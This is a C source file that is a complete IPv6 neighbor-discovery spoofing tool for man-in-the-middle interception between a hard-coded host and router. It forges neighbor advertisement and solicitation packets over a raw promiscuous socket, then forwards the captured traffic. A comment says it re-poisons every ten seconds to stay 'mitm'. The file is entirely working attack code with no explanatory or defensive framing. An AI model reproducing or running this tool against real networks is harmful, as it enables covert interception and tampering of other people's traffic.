#include <stdio.h>      
#include <string.h>      
#include <errno.h>      
#include <sys/socket.h>    
#include <sys/ioctl.h>    
#include <linux/if.h>     
#include <linux/if_packet.h>
#include <netinet/in.h>    
#include <net/ethernet.h>  
#include <fcntl.h>
#include <time.h> 

/* some definitions that we'll need */
static const unsigned char IPV6[2] = {0x86, 0xDD};
static const unsigned char ICMPV6[1] = {0x3A};
static const unsigned char FLG_S[1] = {0x40};
static const unsigned char FLG_O[1] = {0x20};
static const unsigned char FLG_RS[1] = {0xC0};
static const unsigned char FLG_RO[1] = {0xA0};
static const unsigned char ZEROES[8] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const unsigned char TYPE_SOL[1] = {0x87};
static const unsigned char TYPE_ADV[1] = {0x88};
static const unsigned char OPT_S[1] = {0x01};
static const unsigned char OPT_T[1] = {0x02};
static const unsigned char P_HEADER_32[8] = {0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x3A};
static const unsigned char DNS_P_HEADER_63[8] = {0x00, 0x00, 0x00, 0x3F, 0x00, 0x00, 0x00, 0x11};

/* self */
static const unsigned char SELF_MAC[6] = {0x00, 0x0C, 0x29, 0x3C, 0xA7, 0x2A};
static const unsigned char SELF_IPV6[16] = {0xFD, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x88, 0x62, 0xB0, 0x72, 0x4F, 0x20, 0x21, 0xEA};

/* machine 1, router */
static const unsigned char M1_MAC[6] = {0x90, 0x6C, 0xAC, 0x79, 0xB3, 0x30};
static const unsigned char M1_IPV6[16] = {0xFE, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x92, 0x6C, 0xAC, 0xFF, 0xFE, 0x79, 0xB3, 0x30};

/* machine 2, host */
static const unsigned char M2_MAC[6] = {0xB8, 0x27, 0xEB, 0x59, 0x05, 0x36};
static const unsigned char M2_IPV6[16] = {0xFD, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x15, 0x0D, 0x28, 0xDE, 0x68, 0x91, 0xD1, 0x98};

/*
  icmpv6, neighbor sol/adv packet
  0 dst_mac, 6 src_mac, 12 ethertype, 20 ipv6 payload, 22 source_ipv6, 38 dst_ipv6
  54 icmpv6 type, 56 chksum, 58 flags, 62 target, 78 option type, 80 ll address
*/
static const unsigned char pkt[86] = {
0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
0xFF, 0xFF, 0xFF, 0xFF, 0x86, 0xdd, 0x60, 0x00,
0x00, 0x00, 0x00, 0x20, 0x3a, 0xff, 0xFF, 0xFF, 
0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x88, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 
0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x02, 0x01,
0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF
};


/* calculates checksum of icmpv6 packet */
/* it first does a binary addition of all 16 bits words */
/* then it takes care of the carried 1's by shifting bits */
uint16_t chksum (void * buffer, int bytes) {
   uint32_t total = 0;
   uint16_t * ptr = (uint16_t *) buffer;
   int words = bytes / 2;

   while (words--) total += *ptr++;
   while (total & 0xffff0000) total = (total >> 16) + (total & 0xffff);

   return (uint16_t) total;
}

int main (int argc, char const * argv[]) {

  /* use eth0 if no interface specified */
  char if_name[10];
  if (argc >= 2) {
    strcpy (if_name, argv[1]);
  }
  else {
    strcpy (if_name, "eth0");
  }

  /* opens a raw socket */
  int sock;
  if ((sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
    printf("\nCould not create socket (errno %d): %s\n", errno, strerror(errno));
    return -1;
  }
  
  /* set the socket to non blocking */
  int sock_flags;
  sock_flags = fcntl(sock,F_GETFL,0);
  fcntl(sock, F_SETFL, sock_flags | O_NONBLOCK); 

  /* get the interface index for the interface name supplied */
  struct ifreq interface;
  size_t if_name_len = strlen(if_name);
  if (if_name_len < sizeof(interface.ifr_name)) {
    memcpy(interface.ifr_name, if_name, if_name_len);
    interface.ifr_name[if_name_len] = '\0';
  } 
  else {
    printf("\nInterface name is too long\n");
    return -1;
  }
  if (ioctl(sock, SIOCGIFINDEX, &interface) == -1) {
    printf("Could not get the interface index (errno %d): %s\n", errno, strerror(errno));
    return -1;
  }
  int if_index = interface.ifr_ifindex;
  
  /* putting the interface in promiscuous mode */
  ioctl(sock, SIOCGIFFLAGS, &interface);
  interface.ifr_flags |= IFF_PROMISC;
  ioctl(sock, SIOCSIFFLAGS, &interface);
  
  /* sockaddr_ll and the required information */
  struct sockaddr_ll addr_ll;
  addr_ll.sll_ifindex = if_index;
  addr_ll.sll_halen = ETHER_ADDR_LEN;

  /* have to cast sockaddr_ll to sockaddr */
  struct sockaddr * addr = (struct sockaddr *) &addr_ll;
  int addr_len = sizeof(addr_ll);

  /* packets creation */
  unsigned char p_header[40+32];
  uint16_t tmp;

  /* unsolicited neighbor advertisement packet destined to machine 2 (host) */
  unsigned char m2_na_us[86];
  memcpy (m2_na_us, pkt, 86);
  memcpy (&m2_na_us[0], M2_MAC, 6);      
  memcpy (&m2_na_us[6], SELF_MAC, 6);      
  memcpy (&m2_na_us[22], M1_IPV6, 16);    
  memcpy (&m2_na_us[38], M2_IPV6, 16);     
  memcpy (&m2_na_us[54], TYPE_ADV, 1);     
  memcpy (&m2_na_us[58], FLG_RO, 1);       
  memcpy (&m2_na_us[62], M1_IPV6, 16);     
  memcpy (&m2_na_us[80], SELF_MAC, 6);      
  memcpy (&p_header[0], M1_IPV6, 16);      
  memcpy (&p_header[16], M2_IPV6, 16);      
  memcpy (&p_header[32], P_HEADER_32, 8);     
  memcpy (&p_header[40], &m2_na_us[54], 32);  
  tmp = ~(chksum(p_header, 40+32));
  memcpy (&m2_na_us[56], &tmp, 2);        
  
  /* solicited neighbor advertisement packet destined to machine 2 (host) */
  unsigned char m2_na_s[86];
  memcpy (m2_na_s, m2_na_us, 86);    
  memcpy (&m2_na_s[58], FLG_RS, 1);   
  memcpy (&m2_na_s[56], ZEROES, 2);
  memcpy (&p_header[0], M1_IPV6, 16);      
  memcpy (&p_header[16], M2_IPV6, 16);      
  memcpy (&p_header[32], P_HEADER_32, 8);     
  memcpy (&p_header[40], &m2_na_s[54], 32);  
  tmp = ~(chksum(p_header, 40+32));
  memcpy (&m2_na_s[56], &tmp, 2);       
  
  /* neighbor solicitation packet destined to machine 2 (host) */
  unsigned char m2_ns[86];
  memcpy (m2_ns, m2_na_s, 86);    
  memcpy (&m2_ns[54], TYPE_SOL, 1);             
  memcpy (&m2_ns[62], M2_IPV6, 16);       
  memcpy (&m2_ns[78], OPT_S, 1);  
  memcpy (&m2_ns[56], ZEROES, 2);  
  memcpy (&p_header[0], M1_IPV6, 16);      
  memcpy (&p_header[16], M2_IPV6, 16);      
  memcpy (&p_header[32], P_HEADER_32, 8);     
  memcpy (&p_header[40], &m2_ns[54], 32);    
  tmp = ~(chksum(p_header, 40+32));
  memcpy (&m2_ns[56], &tmp, 2);          

  /* unsolicited neighbor advertisement packet destined to machine 1 (router) */
  unsigned char m1_na_us[86];
  memcpy (m1_na_us, pkt, 86);
  memcpy (&m1_na_us[0], M1_MAC, 6);      
  memcpy (&m1_na_us[6], SELF_MAC, 6);      
  memcpy (&m1_na_us[22], M2_IPV6, 16);    
  memcpy (&m1_na_us[38], M1_IPV6, 16);     
  memcpy (&m1_na_us[54], TYPE_ADV, 1);     
  memcpy (&m1_na_us[58], FLG_O, 1);       
  memcpy (&m1_na_us[62], M2_IPV6, 16);     
  memcpy (&m1_na_us[80], SELF_MAC, 6);      
  memcpy (&p_header[0], M2_IPV6, 16);      
  memcpy (&p_header[16], M1_IPV6, 16);      
  memcpy (&p_header[32], P_HEADER_32, 8);     
  memcpy (&p_header[40], &m1_na_us[54], 32);  
  tmp = ~(chksum(p_header, 40+32));
  memcpy (&m1_na_us[56], &tmp, 2);        
  
  /* solicited neighbor advertisement packet destined to machine 1 (router) */
  unsigned char m1_na_s[86];
  memcpy (m1_na_s, m1_na_us, 86);    
  memcpy (&m1_na_s[58], FLG_S, 1);   
  memcpy (&m1_na_s[56], ZEROES, 2);
  memcpy (&p_header[0], M2_IPV6, 16);      
  memcpy (&p_header[16], M1_IPV6, 16);      
  memcpy (&p_header[32], P_HEADER_32, 8);     
  memcpy (&p_header[40], &m1_na_s[54], 32);  
  tmp = ~(chksum(p_header, 40+32));
  memcpy (&m1_na_s[56], &tmp, 2);        
  
  /* neighbor solicitation packet destined to machine 1 (router) */
  unsigned char m1_ns[86];
  memcpy (m1_ns, m1_na_s, 86);    
  memcpy (&m1_ns[54], TYPE_SOL, 1);       
  memcpy (&m1_ns[62], M1_IPV6, 16);     
  memcpy (&m1_ns[78], OPT_S, 1);    
  memcpy (&m1_ns[56], ZEROES, 2);
  memcpy (&p_header[0], M2_IPV6, 16);    
  memcpy (&p_header[16], M1_IPV6, 16);    
  memcpy (&p_header[32], P_HEADER_32, 8);    
  memcpy (&p_header[40], &m1_ns[54], 32);  
  tmp = ~(chksum(p_header, 40+32));
  memcpy (&m1_ns[56], &tmp, 2);        


  /* start */
  sendto(sock, m2_na_us, sizeof(m2_na_us), 0, addr, addr_len);
  sendto(sock, m2_ns, sizeof(m2_ns), 0, addr, addr_len);
  sendto(sock, m1_na_us, sizeof(m1_na_us), 0, addr, addr_len);
  sendto(sock, m1_ns, sizeof(m1_ns), 0, addr, addr_len);
  
  unsigned char buff[65536];
  unsigned char tmp_buff[65536];
  unsigned char udp_p_header[65536];
  unsigned long recv;
  long t = time(0);
  
  while (recv = recvfrom(sock, buff, sizeof(buff), 0, NULL, NULL)) {
    if  (recv != -1) {
      
      /* from host MAC to self MAC */
      if ((memcmp(&buff[0], SELF_MAC, 6) == 0) && (memcmp(&buff[6], M2_MAC, 6) == 0) && (memcmp(&buff[12], IPV6, 2) == 0)) {
        if (memcmp(&buff[38], SELF_IPV6, 16) == 0){
          // to self
        }
        else if (memcmp(&buff[38], M1_IPV6, 16) == 0) {
          // to router
          if ((memcmp(&buff[20], ICMPV6, 1) == 0) && (memcmp(&buff[54], TYPE_SOL, 1) == 0) && (memcmp(&buff[62], M1_IPV6, 16) == 0)) {
            sendto(sock, m2_na_s, sizeof(m2_na_s), 0, addr, addr_len);
          }
          else if (memcmp(&buff[20], ICMPV6, 1) != 0) {
            memcpy (tmp_buff, buff, recv);
            memcpy (&tmp_buff[0], M1_MAC, 6);
            memcpy (&tmp_buff[6], SELF_MAC, 6);
            sendto(sock, tmp_buff, recv, 0, addr, addr_len);
          }
        }
        else {
          // to others
          if (memcmp(&buff[20], ICMPV6, 1) != 0) {
            memcpy (tmp_buff, buff, recv);
            memcpy (&tmp_buff[0], M1_MAC, 6);
            memcpy (&tmp_buff[6], SELF_MAC, 6);
            sendto(sock, tmp_buff, recv, 0, addr, addr_len);
          }
        }
      }
      
      /* from router MAC to self MAC */
      else if ((memcmp(&buff[0], SELF_MAC, 6) == 0) && (memcmp(&buff[6], M1_MAC, 6) == 0) && (memcmp(&buff[12], IPV6, 2) == 0)) {
        if (memcmp(&buff[38], SELF_IPV6, 16) == 0) {
          // to self
        }
        else if (memcmp(&buff[38], M2_IPV6, 16) == 0) {
          // to host
          if ((memcmp(&buff[20], ICMPV6, 1) == 0) && (memcmp(&buff[54], TYPE_SOL, 1) == 0) && (memcmp(&buff[62], M2_IPV6, 16) == 0)) {
            sendto(sock, m1_na_s, sizeof(m1_na_s), 0, addr, addr_len);
          }
          else if (memcmp(&buff[20], ICMPV6, 1) != 0) {
            memcpy (tmp_buff, buff, recv);
            memcpy (&tmp_buff[0], M2_MAC, 6);
            memcpy (&tmp_buff[6], SELF_MAC, 6);
            sendto(sock, tmp_buff, recv, 0, addr, addr_len);
          }
        }
        else {
          // to others
          if (memcmp(&buff[20], ICMPV6, 1) != 0) {
            memcpy (tmp_buff, buff, recv);
            memcpy (&tmp_buff[0], M2_MAC, 6);
            memcpy (&tmp_buff[6], SELF_MAC, 6);
            sendto(sock, tmp_buff, recv, 0, addr, addr_len);
          }
        }
      }
    }
    
    /* making sure i'm still mitm every 10 seconds */
    if (time(0) > t + 10) {
      sendto(sock, m2_na_us, sizeof(m2_na_us), 0, addr, addr_len);
      sendto(sock, m2_ns, sizeof(m2_ns), 0, addr, addr_len);
      sendto(sock, m1_na_us, sizeof(m1_na_us), 0, addr, addr_len);
      sendto(sock, m1_ns, sizeof(m1_ns), 0, addr, addr_len);
      t = time(0);
    }
  }
}
